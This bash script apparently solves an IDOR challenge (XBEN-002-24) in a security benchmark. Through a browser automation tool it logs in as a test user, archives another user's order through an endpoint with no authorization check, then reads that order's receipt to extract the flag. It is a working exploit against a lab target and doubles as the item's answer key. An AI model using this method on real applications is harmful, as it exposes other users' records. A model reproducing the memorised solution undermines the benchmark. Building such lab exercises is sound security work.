#!/usr/bin/env bash
# XBEN-002-24 — "Trading Platform" (tags: idor)
#
# The hardened sibling of XBEN-001: `/order/<id>/receipt` now checks that you are
# the order's creator *or its archiver*. But `/order/<id>/archive` does no check
# at all and sets `order.archiver = you`.
#
# So the authorization the receipt asks for is one the attacker can grant
# themselves: archive the order, then read it.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben002-$$"
ORDER="${2:-300198}"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
"$H5I" websec replay req_0 --create \
    --set 'method=POST' --set 'path=/password/test' --set 'form.password=test' \
    --session "$SESSION" >/dev/null
"$H5I" browser navigate "$URL/order/$ORDER/archive" --session "$SESSION" >/dev/null
"$H5I" browser navigate "$URL/order/$ORDER/receipt" --session "$SESSION" >/dev/null
"$H5I" browser markdown --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
